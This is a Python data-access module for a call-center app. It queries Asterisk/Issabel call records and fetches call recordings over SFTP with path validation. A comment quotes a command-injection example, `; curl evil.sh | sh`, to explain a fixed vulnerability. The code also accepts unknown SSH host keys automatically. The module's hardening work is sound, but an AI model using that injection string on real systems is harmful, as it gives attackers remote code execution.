# Importing module
import datetime as _dt
import logging
import os
import re
from zoneinfo import ZoneInfo

import mysql.connector
import paramiko

from core.config import Config

log = logging.getLogger("cawp.issable")

# Only a conservative character set is accepted in a recording path, and the path must
# resolve under RECORDINGS_ROOT. The previous code interpolated the value straight from
# the query string into `ssh.exec_command(f"cat {path}")` **as root**, so
# `?recordingPath=x; curl evil.sh | sh` was a remote shell on the telephony box (review S1).
# `+` is allowed (a number in E.164 inside a name, e.g. out-+9665...-...wav): the file is read
# over SFTP/HTTP or from a local directory, never through a shell.
_SAFE_REMOTE_PATH = re.compile(r"[A-Za-z0-9_.+/-]+")

# Bare recording names (no YYYY/MM/DD/ directory) -> the PBX day directory they are in:
#   out-<dst>-<ext>-YYYYMMDD-HHMMSS-<uniqueid>.wav, exten-..., q-..., rg-...  the YYYYMMDD part
#   in-ivr-<epoch>.<seq>.wav (the IVR's MixMonitor)                         the uniqueid epoch, Asia/Riyadh
#   cawp-<attempt>.wav (click-to-call) or anything else                      the CDR calldate, when given
# The PBX writes the directory in Asia/Riyadh wall-clock time (STRFTIME(...,Asia/Riyadh) and the
# Issabel default), like the CDR calldate.
_DAY_TOKEN = re.compile(r"^(20[0-9]{2})(0[1-9]|1[0-2])(0[1-9]|[12][0-9]|3[01])$")
_EPOCH_NAME = re.compile(r"-(1[0-9]{9})\.[0-9]+\.[A-Za-z0-9]+$")
_RIYADH = ZoneInfo("Asia/Riyadh")

# 2026-10-25 (PBX CPU): the Issabel asteriskcdrdb.cdr has NO calldate index (only uniqueid), so
# every date filter read all 2.66M rows, ~11 times a minute from the client notes page. On an
# Asterisk <= 11 CDR (no linkedid column) the uniqueid is "<epoch>.<seq>" of the channel start,
# so an added uniqueid range (the same days, an hour wider on each side; string comparison is
# exact while epochs have 10 digits) uses that index. The original DATE() predicate stays, so the
# rows are exactly the same. Asterisk 12+ CDRs (linkedid, Originate ChannelIds `cawp-...` as
# uniqueid) get no bound. Cached per process. The bounds are computed here and sent as
# parameters: a value built in SQL (CAST(... AS CHAR)) carries the connection's collation and the
# Issabel column's differs (utf8mb4_unicode_ci) -> "Illegal mix of collations".
_CDR_EPOCH_UNIQUEID: dict = {}
_UID_BOUND = "uniqueid >= %s AND uniqueid < %s AND "


def _pbx_day(value) -> _dt.date | None:
    """The date part of a legacy date argument ('YYYY-MM-DD', 'YYYY-MM-DD HH:MM:SS'), else None."""
    try:
        return _dt.date.fromisoformat(str(value).strip()[:10])
    except ValueError:
        return None


def _epoch(day: _dt.date) -> int:
    from services.reports_v2_cdr import pbx_zone
    return int(_dt.datetime.combine(day, _dt.time.min, pbx_zone()).timestamp())


def _day_dir(file_name, calldate=None):
    """'YYYY/MM/DD' for a bare recording name, or None."""
    tokens = file_name.split('-')
    for tok in tokens[3:4] + tokens:                         # the legacy position (4th part) first
        if _DAY_TOKEN.match(tok):
            return f"{tok[:4]}/{tok[4:6]}/{tok[6:8]}"
    m = _EPOCH_NAME.search(file_name)
    if m:
        return _dt.datetime.fromtimestamp(int(m.group(1)), _RIYADH).strftime("%Y/%m/%d")
    if isinstance(calldate, (_dt.date, _dt.datetime)):
        return calldate.strftime("%Y/%m/%d")
    return None


class Issable_db():

    def fetchDic(self, rows, colnames):
        dict = {}
        dictlist = []
        for row in rows:
            i = 0
            dict.clear()
            for r in row:
                dict.update({colnames[i]: r})
                i = i + 1
                if len(row) == i:
                    dictlist.append(dict.copy())
        return dictlist

    def __init__(self):
        # Creating connection object (credentials + timeout come from env; see core/config.py)
        self.hostname = Config.CDR_HOST
        self.database = Config.CDR_DB
        self.username = Config.CDR_USER
        self.pwd = Config.CDR_PASSWORD
        self.conn = None
        self.cur = None
        if not Config.CDR_ENABLED:
            return
        self.conn = self._connect()

    def _connect(self):
        try:
            return mysql.connector.connect(
                host=self.hostname,
                database=self.database,
                user=self.username,
                password=self.pwd,
                connection_timeout=Config.CDR_CONNECT_TIMEOUT,
            )
        except Exception as error:
            # Unreachable PBX must not take the dashboards down: callers get [] instead of a hang
            log.warning("CDR database unavailable (%s): %s", self.hostname, error)
            return None

    def _cursor(self):
        if self.conn is None:
            raise ConnectionError("CDR database unavailable")
        return self.conn.cursor()

    def _close(self, cur):
        """`finally: if cur is not None` used to raise UnboundLocalError when
        `self.conn.cursor()` itself had raised, masking the real error (review 3.17)."""
        try:
            if cur is not None:
                cur.close()
        except Exception:  # noqa: BLE001
            pass
        try:
            if self.conn is not None:
                self.conn.close()
        except Exception:  # noqa: BLE001
            pass

    def _epoch_uniqueid(self) -> bool:
        """Whether the CDR's uniqueid is the epoch-based Asterisk <= 11 one (no linkedid column)."""
        if "cdr" not in _CDR_EPOCH_UNIQUEID:
            cur = None
            try:
                cur = self._cursor()
                cur.execute("SHOW COLUMNS FROM asteriskcdrdb.cdr LIKE %s", ("linkedid",))
                _CDR_EPOCH_UNIQUEID["cdr"] = not cur.fetchall()
            except Exception as error:  # noqa: BLE001 - no bound then (the query itself reports)
                log.warning("CDR schema check failed: %s", error)
                return False
            finally:
                if cur is not None:
                    try:
                        cur.close()
                    except Exception:  # noqa: BLE001
                        pass
        return _CDR_EPOCH_UNIQUEID["cdr"]

    def _uid_bound(self, first_day, last_day) -> tuple[str, tuple]:
        """(the uniqueid range predicate + " AND ", its parameters) covering the PBX days
        first_day .. last_day (inclusive) an hour wider on each side, or ("", ())."""
        lo, hi = _pbx_day(first_day), _pbx_day(last_day)
        if lo is None or hi is None or not self._epoch_uniqueid():
            return "", ()
        return _UID_BOUND, (str(_epoch(lo) - 3600), str(_epoch(hi + _dt.timedelta(days=1)) + 3600))

    def _query(self, sql, params=()):
        """Run a parameterized query and return a list of dicts ([] on any failure)."""
        cur = None
        try:
            cur = self._cursor()
            cur.execute(sql, params)
            colnames = [desc[0] for desc in cur.description]
            rows = cur.fetchall()
            return self.fetchDic(rows, colnames) if rows else []
        except Exception as error:
            log.warning("CDR query failed: %s", error)
            return []
        finally:
            self._close(cur)

    @staticmethod
    def _mobile_like_clause(mobile_numbers, columns):
        """Build `(col LIKE %s OR ...)` plus the matching parameter list.

        Returns (clause, params) or (None, []) when no number is usable.
        """
        clauses, params = [], []
        for mobile in mobile_numbers:
            mobile_digits = ''.join(filter(str.isdigit, str(mobile)))
            if len(mobile_digits) < 9:
                continue  # Skip numbers with less than 9 digits (invalid mobile numbers)
            last_9_digits = mobile_digits[-9:]
            per_column = []
            for col in columns:
                per_column.append("%s LIKE %%s" % col)
                params.append("%%%s%%" % last_9_digits)
            clauses.append("(" + " OR ".join(per_column) + ")")
        if not clauses:
            return None, []
        return "(" + " OR ".join(clauses) + ")", params

    def GetSubscription(self):
        # calldate: the date and time of the start of the call. It is a datetime type and has the format YYYY-MM-DD HH:MM:SS
        # clid: the caller ID of the caller. It is a varchar type and has the format "Name <Number>"
        # src:  the source of the call. It is a varchar type and has the format "Number"
        # dst: the destination of the call. It is a varchar type and has the format "Number"
        from services.reports_v2_cdr import pbx_zone
        today = _dt.datetime.now(pbx_zone()).date()
        bound, bparams = self._uid_bound(today, today)
        return self._query(
            """
            SELECT * FROM asteriskcdrdb.cdr
            WHERE {bound}DATE(calldate) = CURDATE()
            ORDER BY calldate DESC
            """.format(bound=bound),
            bparams,
        )

    def GetCallsByDate(self, start_date, end_date):
        # start_date / end_date come unvalidated from request.args; parameterized so they
        # cannot be turned into a UNION SELECT against asteriskcdrdb (review S7).
        bound, bparams = self._uid_bound(start_date, end_date)
        return self._query(
            """
            SELECT * FROM asteriskcdrdb.cdr
            WHERE {bound}DATE(calldate) BETWEEN %s AND %s AND src NOT LIKE '+%%' AND src NOT LIKE '0%%'
            ORDER BY calldate DESC
            """.format(bound=bound),
            bparams + (start_date, end_date),
        )

    def GetCallsFromCallCenter(self, start_date, end_date, mobile_numbers):
        """
        Get calls from call_center.calls table with agent and recording information

        Args:
            start_date (str): Start date in YYYY-MM-DD format
            end_date (str): End date in YYYY-MM-DD format
            mobile_numbers (list): List of mobile numbers to search for

        Returns:
            list: List of dictionaries containing call data
        """
        if not mobile_numbers:
            return []
        mobile_filter, mobile_params = self._mobile_like_clause(mobile_numbers, ["c.phone"])
        if mobile_filter is None:
            return []
        sql = """
            SELECT
                c.start_time as calldate,
                a.name as src,
                c.phone as dst,
                c.duration,
                c.status as disposition,
                cr.recordingfile,
                c.uniqueid
            FROM call_center.calls c
            JOIN call_center.call_recording cr ON cr.id_call_outgoing = c.id AND cr.uniqueid = c.uniqueid
            JOIN call_center.agent a ON c.id_agent = a.id
            WHERE c.start_time >= DATE(%s) AND c.start_time < DATE(%s) + INTERVAL 1 DAY
            AND DATE(c.start_time) BETWEEN %s AND %s
            AND {mobile_filter}
            ORDER BY c.start_time DESC
        """.format(mobile_filter=mobile_filter)
        return self._query(sql, (start_date, end_date, start_date, end_date, *mobile_params))

    def GetAllCallsFromCallCenter(self, start_date, end_date):
        """
        Get all calls from call_center.calls table with agent and recording information

        Args:
            start_date (str): Start date in YYYY-MM-DD format
            end_date (str): End date in YYYY-MM-DD format

        Returns:
            list: List of dictionaries containing call data
        """
        return self._query(
            """
            SELECT
                c.start_time as calldate,
                a.name as src,
                c.phone as dst,
                c.duration,
                c.status as disposition,
                cr.recordingfile,
                c.uniqueid
            FROM call_center.calls c
            JOIN call_center.call_recording cr ON cr.id_call_outgoing = c.id AND cr.uniqueid = c.uniqueid
            JOIN call_center.agent a ON c.id_agent = a.id
            WHERE c.start_time >= DATE(%s) AND c.start_time < DATE(%s) + INTERVAL 1 DAY
            AND DATE(c.start_time) BETWEEN %s AND %s
            ORDER BY c.start_time DESC
            """,
            (start_date, end_date, start_date, end_date),
        )

    def GetCombinedCalls(self, start_date, end_date, mobile_numbers):
        """
        Get calls from both asteriskcdrdb.cdr and call_center.calls tables

        Args:
            start_date (str): Start date in YYYY-MM-DD format
            end_date (str): End date in YYYY-MM-DD format
            mobile_numbers (list): List of mobile numbers to search for

        Returns:
            list: asterisk calls followed by call-center calls ([] on failure)
        """
        try:
            # Get calls from both tables
            asterisk_calls = self.GetCallsByDateAbdListNumber(start_date, end_date, mobile_numbers)
            if not Config.CDR_CALL_CENTER:          # a PBX without Issabel's call-center module
                return asterisk_calls or []

            # Create new connection for call center calls since the previous one was closed
            self.conn = self._connect()

            call_center_calls = self.GetCallsFromCallCenter(start_date, end_date, mobile_numbers)
            return (asterisk_calls or []) + (call_center_calls or [])
        except Exception as error:
            log.warning("GetCombinedCalls failed: %s", error)
            return []

    def GetCallsByDateAbdListNumber(self, start_date, end_date, mobile_numbers):
        # calldate: the date and time of the start of the call. It is a datetime type and has the format YYYY-MM-DD HH:MM:SS
        # clid: the caller ID of the caller. It is a varchar type and has the format "Name <Number>"
        # src:  the source of the call. It is a varchar type and has the format "Number"
        # dst: the destination of the call. It is a varchar type and has the format "Number"
        if not mobile_numbers:
            # If empty list, return empty result
            return []
        mobile_filter, mobile_params = self._mobile_like_clause(mobile_numbers, ["dst", "src"])
        if mobile_filter is None:
            return []
        bound, bparams = self._uid_bound(start_date, end_date)
        sql = """
            SELECT * FROM asteriskcdrdb.cdr
            WHERE {bound}DATE(calldate) BETWEEN %s AND %s AND {mobile_filter}
            ORDER BY calldate DESC
        """.format(bound=bound, mobile_filter=mobile_filter)
        return self._query(sql, bparams + (start_date, end_date, *mobile_params))

    def genrate_call_path(self, file_name, calldate=None):
        """
        Generate the remote file path for a call recording based on the file name.

        Args:
            file_name (str): The name of the call recording file or full path.
            calldate (date|datetime, optional): the CDR calldate of the record naming the file,
                used when the name itself carries no day (e.g. `cawp-<attempt>.wav`).

        Returns:
            str: The full remote path to the call recording (the name unchanged when no day
            can be found; _validate_remote_path then refuses it).
        """
        root = Config.RECORDINGS_ROOT
        if not root.endswith("/"):
            root += "/"

        # Check if the file_name already contains the full path
        if file_name.startswith(root):
            # If it's already a full path, return as is
            return file_name

        #check if the file_name  start with yyyy/mm/dd  --> always with call center calls
        if (file_name[0:4].isdigit() and file_name[4:5] == '/' and file_name[5:7].isdigit()
                and file_name[7:8] == '/' and file_name[8:10].isdigit() and file_name[10:11] == '/'):
            return f"{root}{file_name}"

        # A bare name: 'out-300531251001-420-20250726-131150-1753524710.290454.wav' (the day is the
        # 4th part), 'in-ivr-1792072292.176850.wav' (the uniqueid epoch), 'cawp-<attempt>.wav' (the
        # CDR calldate). See _day_dir.
        if "/" not in file_name:
            day = _day_dir(file_name, calldate)
            if day:
                return f"{root}{day}/{file_name}"
        log.warning("Unexpected recording filename format: %s", file_name)
        return file_name

    @staticmethod
    def _validate_remote_path(remote_file_path):
        """Reject anything that is not a plain path under RECORDINGS_ROOT.

        Returns the validated path or None.
        """
        if not remote_file_path or not isinstance(remote_file_path, str):
            return None
        if not _SAFE_REMOTE_PATH.fullmatch(remote_file_path):
            log.warning("rejected recording path (illegal characters): %r", remote_file_path)
            return None
        if ".." in remote_file_path.split("/"):
            log.warning("rejected recording path (traversal): %r", remote_file_path)
            return None
        root = Config.RECORDINGS_ROOT
        if not root.endswith("/"):
            root += "/"
        if not remote_file_path.startswith(root):
            log.warning("rejected recording path (outside %s): %r", root, remote_file_path)
            return None
        return remote_file_path

    def download_call_recording(self, remote_file_path):
        """
        Download a call recording from the Asterisk server over SFTP.

        The path is validated against RECORDINGS_ROOT first and read with
        `ssh.open_sftp()`; the previous implementation ran `ls -lh {path}` and
        `cat {path}` through `exec_command` as root, so the query string was executed
        as a shell command (review S1).

        Args:
            remote_file_path (str): Path to the file on the remote server

        Returns:
            bytes or None: File data as bytes if successful, None if failed
        """
        remote_file_path = self.genrate_call_path(remote_file_path)
        remote_file_path = self._validate_remote_path(remote_file_path)
        if remote_file_path is None:
            return None

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sftp = None
        try:
            connect_kwargs = {
                "username": Config.RECORDINGS_SSH_USER,
                "timeout": Config.RECORDINGS_SSH_TIMEOUT,
                "banner_timeout": Config.RECORDINGS_SSH_TIMEOUT,
                "auth_timeout": Config.RECORDINGS_SSH_TIMEOUT,
            }
            if Config.RECORDINGS_SSH_PASSWORD:
                connect_kwargs["password"] = Config.RECORDINGS_SSH_PASSWORD
            elif Config.RECORDINGS_SSH_KEY and os.path.exists(Config.RECORDINGS_SSH_KEY):
                connect_kwargs["key_filename"] = Config.RECORDINGS_SSH_KEY
            ssh.connect(Config.RECORDINGS_SSH_HOST, **connect_kwargs)

            sftp = ssh.open_sftp()
            try:
                stat = sftp.stat(remote_file_path)
            except IOError as e:
                log.warning("recording not found %s: %s", remote_file_path, e)
                return None
            if not stat.st_size:
                log.warning("recording is empty: %s", remote_file_path)
                return None
            with sftp.open(remote_file_path, "rb") as fh:
                fh.prefetch()
                file_data = fh.read()
            return file_data or None
        except paramiko.AuthenticationException:
            log.warning("recording SSH authentication failed")
            return None
        except paramiko.SSHException as e:
            log.warning("recording SSH connection failed: %s", e)
            return None
        except Exception as e:  # noqa: BLE001
            log.warning("recording download failed: %s", e)
            return None
        finally:
            try:
                if sftp is not None:
                    sftp.close()
            except Exception:  # noqa: BLE001
                pass
            ssh.close()
